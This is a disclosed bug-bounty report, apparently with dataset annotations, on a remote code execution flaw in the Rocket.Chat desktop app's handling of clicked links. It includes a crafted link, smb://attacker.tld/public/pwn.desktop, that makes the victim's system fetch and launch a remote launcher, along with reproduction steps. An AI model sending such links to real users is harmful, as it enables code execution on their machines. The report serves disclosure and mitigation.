{
  "reported_to": "Rocket.Chat",
  "reported_by": "baltpeter ",
  "title": "Insecure use of shell.openExternal() in Rocket.Chat Desktop App leading to RCE",
  "content": "\nSummary: The Rocket.Chat Desktop app passes the links users click on to Electron's shell.openExternal() function which can lead to remote code execution.\nDescription: The filtering on the URLs passed to shell.openExternal() is insufficient. An attacker can craft and send a link that when clicked will cause malicious code from a remote origin to be executed on the user's system. The specific attack presented here has been tested with Xubuntu 20.04, however similar attacks are also possible on other systems, including non-Linux operating systems.\nReleases Affected:\nTested with latest release 2.17.10 from https://github.com/RocketChat/Rocket.Chat.Electron/releases\nTested with latest commit 4c06582 on the develop branch from https://github.com/RocketChat/Rocket.Chat.Electron\nSteps To Reproduce (from initial installation to vulnerability):\nInstall Rocket.Chat Desktop on Xubuntu 20.04.\nLogin and join a channel.\n[Desktop Entry]\n\nFrom another account in the same channel, send the following message with the corresponding values replaced: smb://attacker.tld/public/pwn.desktop\nClick the link and (if necessary) confirm starting the untrusted launcher.\nNotice the calculator and message box appearing, confirming remote code execution.\nSupporting Material/References:\nI have attached a video of the attack to the report.\nSuggested mitigation\nThe problem is in the filter for local file paths in the preload scripts that sets up the link handler here: https://github.com/RocketChat/Rocket.Chat.Electron/blob/4c06582ba3021fcf10e6230286231d50e26e2723/src/preload/links.js#L24\nThe filter only acts as a blocklist, filtering out file:// links. There are however plenty of other protocols depending on the system, like smb:// as shown here. Therefore, only an allowlist can successfully prevent attacks here. Usually, allowing http://, https:// and mailto: will be enough but you may have different requirements.\nBest Regards,\n\nBenjamin Altpeter\n\nTechnical University of Braunschweig, Germany\nImpact\nThe attack can be triggered remotely by an attacker by simply sending a message to a channel.\nThe particular attack presented here requires user interaction. The user has to click the link (which is not obfuscated) and potentially confirm launching the executable. The last part may not be necessary depending on the particular attack vector and system the user runs.\nThis particular presented attack only works on certain Linux distributions. However, this is only due to the particular attack payload used (a Linux .desktop file accessed over Samba). Similar payloads will also work on other Linux distributions as well as Windows and macOS. The Electron documentation explicitly warns against using shell.openExternal() with untrusted content: https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content\nIf the attack is executed successfully, the attacker can run arbitrary code on the user's system.\nPatching the problem is simple and doesn't break any legitimate use cases that I can think of.\nThe particular attack presented here requires user interaction. The user has to click the link (which is not obfuscated) and potentially confirm launching the executable. The last part may not be necessary depending on the particular attack vector and system the user runs.\nThis particular presented attack only works on certain Linux distributions. However, this is only due to the particular attack payload used (a Linux .desktop file accessed over Samba). Similar payloads will also work on other Linux distributions as well as Windows and macOS. The Electron documentation explicitly warns against using shell.openExternal() with untrusted content: https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content\nIf the attack is executed successfully, the attacker can run arbitrary code on the user's system.\nPatching the problem is simple and doesn't break any legitimate use cases that I can think of.\n\n",
  "severity": [
    9.0,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1659363420,
  "report_url": "https://hackerone.com/reports/924151",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Install Rocket.Chat Desktop on Xubuntu 20.04."
    ],
    [
      2,
      "Login and join a channel."
    ],
    [
      3,
      "From another account in the same channel, send a message with a crafted link: smb://attacker.tld/public/pwn.desktop"
    ],
    [
      4,
      "Click the link and confirm starting the untrusted launcher if prompted."
    ],
    [
      5,
      "Observe the calculator and message box appearing, confirming remote code execution."
    ]
  ],
  "vuln_description": "The Rocket.Chat Desktop app insecurely uses Electron's shell.openExternal() function to handle clicked links, allowing an attacker to craft a malicious link that, when clicked, executes arbitrary code on the user's system. The vulnerability arises from insufficient URL filtering, which only blocks file:// links but allows other dangerous protocols like smb://.",
  "reason": "The vulnerability involves understanding how shell.openExternal() works in Electron and recognizing that the application's URL filtering is insufficient. The attack requires crafting a specific payload (a .desktop file accessed over Samba) and understanding that the user interaction (clicking the link) can lead to code execution. While the attack requires user interaction, the discovery of the vulnerability is straightforward once the behavior of shell.openExternal() is understood.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "reasoning": "The vulnerability involves passing untrusted URLs through shell.openExternal() in a desktop app. The injection vector (chat message with a malicious URL) would be detected as an injectable parameter through HTTP logging. However, the methodology focuses on web-based payload execution detection through HTTP responses or same-application navigation. The RCE occurs client-side via Electron's external protocol handling, which doesn't produce observable web application side effects. While the parameter is injectable, the payload's success (remote code execution) cannot be verified through the same web channel or regular navigation patterns as required by the methodology.",
    "is_simple_injection": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves the insecure handling of URLs in the Rocket.Chat Desktop app, specifically the use of shell.openExternal() with untrusted content. This is not an authentication or authorization issue but rather a security misconfiguration in how external links are processed. The proposed methodologies focus on AuthN/AuthZ bypasses and IDOR vulnerabilities, which are not applicable here as the issue does not involve crossing authorization boundaries or improper access control.",
    "is_detectable": false
  }
}